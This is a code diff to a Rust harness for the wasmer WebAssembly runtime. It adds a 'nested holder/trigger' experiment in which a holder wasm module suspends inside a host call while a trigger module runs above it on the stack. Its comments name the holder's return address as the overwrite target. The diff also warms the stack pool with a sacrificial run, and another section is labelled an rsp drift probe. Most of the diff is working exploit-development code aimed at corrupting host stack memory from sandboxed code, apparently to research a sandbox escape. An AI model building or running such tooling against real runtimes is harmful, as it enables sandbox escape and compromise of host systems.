@@ -40,6 +40,30 @@ const PATTERN_WAT: &str = r#"
 
 const GIB: usize = 1 << 30;
 
+// E4 holder module: stages distinctive i64 values, then suspends inside the
+// `env.query` host import while the trigger runs on the stack directly above.
+// The return address of that call is the overwrite target.
+const HOLDER_WAT: &str = r#"
+(module
+  (import "env" "query" (func $q (param i32) (result i32)))
+  (memory 1)
+  (func (export "run") (param $tag i32) (result i32)
+    (local $a i64) (local $b i64) (local $c i64) (local $d i64)
+    (local.set $a (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1111)))
+    (local.set $b (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x2222)))
+    (local.set $c (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x3333)))
+    (local.set $d (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x4444)))
+    (call $q (local.get $tag))
+    drop
+    (i64.add (i64.add (local.get $a) (local.get $b)) (i64.add (local.get $c) (local.get $d)))
+    drop
+    (i32.const 0)))
+"#;
+
+static NESTED_B_STORE: Mutex<usize> = Mutex::new(0);
+static NESTED_B_FUNC: Mutex<usize> = Mutex::new(0);
+static NESTED_B_ITERS: AtomicU64 = AtomicU64::new(0);
+
 // ---------------- rsp drift probe (Hexens WASMageddon shape) ----------------
 
 #[cfg(target_arch = "x86_64")]
@@ -426,6 +450,156 @@ fn writestream(path: &str, iters: i32, stride: u64, warm_path: Option<&str>, war
     println!("]}}");
 }
 
+// ---------------- E4: nested holder/trigger (targeted overwrite) ----------------
+
+fn nested(
+    trigger_path: &str,
+    iters: i32,
+    stride: u64,
+    warm_path: Option<&str>,
+    warm_threads: usize,
+    tag: i32,
+) {
+    let trigger_src = match fs::read(trigger_path) {
+        Ok(b) => b,
+        Err(e) => {
+            println!("{{\"pattern\":\"{}\",\"error\":\"read: {}\"}}", trigger_path, e);
+            return;
+        }
+    };
+    if warm_threads > 0 {
+        if let Some(wpath) = warm_path {
+            if let Ok(wbytes) = fs::read(wpath) {
+                eprintln!("WARM growing pool with {} threads using {}", warm_threads, wpath);
+                grow_pool(&wbytes, warm_threads);
+                eprintln!("WARM pool grown");
+            }
+        }
+        // sacrificial run: rotate the pool front so the holder pops a stack whose
+        // neighbour below is already mapped
+        {
+            let mut store = Store::new(engine());
+            if let Ok(module) = Module::new(&store, &trigger_src) {
+                let mut imports = Imports::new();
+                imports.define(
+                    "env",
+                    "probe",
+                    Function::new_typed(&mut store, |_: i32, _: i32, _: i32| -> i32 { 0 }),
+                );
+                if let Ok(instance) = Instance::new(&mut store, &module, &imports) {
+                    if let Ok(f) = instance.exports.get_function("run") {
+                        let _ = f.call(&mut store, &[wasmer::Value::I32(1000)]);
+                        eprintln!("WARM sacrificial run done");
+                    }
+                }
+            }
+        }
+    }
+    install_ws_handlers();
+
+    // B = trigger (runs nested on the stack above the holder)
+    let mut store_b = Store::new(engine());
+    let module_b = match Module::new(&store_b, &trigger_src) {
+        Ok(m) => m,
+        Err(e) => {
+            println!("{{\"pattern\":\"{}\",\"error\":\"compile trigger: {}\"}}", trigger_path, norm_err(&e));
+            return;
+        }
+    };
+    let mut imports_b = Imports::new();
+    imports_b.define(
+        "env",
+        "probe",
+        Function::new_typed(&mut store_b, move |i: i32, _: i32, _: i32| -> i32 {
+            let _n = WS_CALLS.fetch_add(1, Ordering::Relaxed);
+            let iu = i as u64;
+            if stride == 0 || iu % stride == 0 || iu + 1 >= iters as u64 {
+                ws_scan(i);
+            }
+            0
+        }),
+    );
+    let instance_b = match Instance::new(&mut store_b, &module_b, &imports_b) {
+        Ok(i) => i,
+        Err(e) => {
+            println!("{{\"pattern\":\"{}\",\"error\":\"instantiate trigger: {}\"}}", trigger_path, norm_err(&e));
+            return;
+        }
+    };
+    let f_b = match instance_b.exports.get_function("run") {
+        Ok(f) => f,
+        Err(e) => {
+            println!("{{\"pattern\":\"{}\",\"error\":\"no trigger run: {}\"}}", trigger_path, norm_err(&e));
+            return;
+        }
+    };
+    let f_b_ptr: *const Function = Box::leak(Box::new(f_b));
+    if let Ok(mut s) = NESTED_B_STORE.lock() {
+        *s = &mut store_b as *mut Store as usize;
+    }
+    if let Ok(mut f) = NESTED_B_FUNC.lock() {
+        *f = f_b_ptr as usize;
+    }
+    NESTED_B_ITERS.store(iters as u64, Ordering::Relaxed);
+
+    // A = holder (suspends inside env.query while the trigger runs above it)
+    let mut store_a = Store::new(engine());
+    let module_a = match Module::new(&store_a, HOLDER_WAT) {
+        Ok(m) => m,
+        Err(e) => {
+            println!("{{\"pattern\":\"{}\",\"error\":\"compile holder: {}\"}}", trigger_path, norm_err(&e));
+            return;
+        }
+    };
+    let mut imports_a = Imports::new();
+    imports_a.define(
+        "env",
+        "query",
+        Function::new_typed(&mut store_a, move |t: i32| -> i32 {
+            let sp = NESTED_B_STORE.lock().map(|v| *v).unwrap_or(0);
+            let fp = NESTED_B_FUNC.lock().map(|v| *v).unwrap_or(0);
+            if sp != 0 && fp != 0 {
+                let store = unsafe { &mut *(sp as *mut Store) };
+                let f = unsafe { &*(fp as *const Function) };
+                let n = NESTED_B_ITERS.load(Ordering::Relaxed) as i32;
+                eprintln!("NESTED trigger start");
+                let r = f.call(store, &[wasmer::Value::I32(n)]);
+                match &r {
+                    Ok(_) => eprintln!("NESTED trigger ok"),
+                    Err(e) => eprintln!("NESTED trigger err: {}", norm_err(e)),
+                }
+            }
+            t
+        }),
+    );
+    let instance_a = match Instance::new(&mut store_a, &module_a, &imports_a) {
+        Ok(i) => i,
+        Err(e) => {
+            println!("{{\"pattern\":\"{}\",\"error\":\"instantiate holder: {}\"}}", trigger_path, norm_err(&e));
+            return;
+        }
+    };
+    let f_a = match instance_a.exports.get_function("run") {
+        Ok(f) => f,
+        Err(e) => {
+            println!("{{\"pattern\":\"{}\",\"error\":\"no holder run: {}\"}}", trigger_path, norm_err(&e));
+            return;
+        }
+    };
+    eprintln!("NESTED holder start (tag {})", tag);
+    let res = f_a.call(&mut store_a, &[wasmer::Value::I32(tag)]);
+    let result = match &res {
+        Ok(_) => "ok".to_string(),
+        Err(e) => norm_err(e),
+    };
+    eprintln!("NESTED holder returned: {}", result);
+    let scans = WS_SCANS.lock().map(|v| v.len()).unwrap_or(0);
+    println!(
+        "{{\"pattern\":\"{}\",\"iters\":{},\"result\":\"{}\",\"scans\":{}}}",
+        trigger_path, iters, result, scans
+    );
+}
+
 fn try_sentinel(addr: usize, magic: u64) -> Option<usize> {
     unsafe {
         let p = mmap(
@@ -612,9 +786,16 @@ fn main() {
         let warm_path = args.get(5).map(|s| s.as_str());
         let warm_threads: usize = args.get(6).and_then(|s| s.parse().ok()).unwrap_or(0);
         writestream(&args[2], iters, stride, warm_path, warm_threads);
+    } else if args.len() >= 4 && args[1] == "nested" {
+        let iters: i32 = args[3].parse().unwrap_or(1000);
+        let stride: u64 = args.get(4).and_then(|s| s.parse().ok()).unwrap_or(4096);
+        let warm_path = args.get(5).map(|s| s.as_str());
+        let warm_threads: usize = args.get(6).and_then(|s| s.parse().ok()).unwrap_or(0);
+        let tag: i32 = args.get(7).and_then(|s| s.parse().ok()).unwrap_or(1);
+        nested(&args[2], iters, stride, warm_path, warm_threads, tag);
     } else {
         eprintln!(
-            "usage: {} patterns | run <file.wat> | drift <file.wat> <iters> | writestream <file.wat> <iters> [stride] [warm.wat] [warm_threads]",
+            "usage: {} patterns | run <file.wat> | drift <file.wat> <iters> | writestream <file.wat> <iters> [stride] [warm.wat] [warm_threads] | nested <trigger.wat> <iters> [stride] [warm.wat] [warm_threads] [tag]",
             args[0]
         );
         std::process::exit(2);
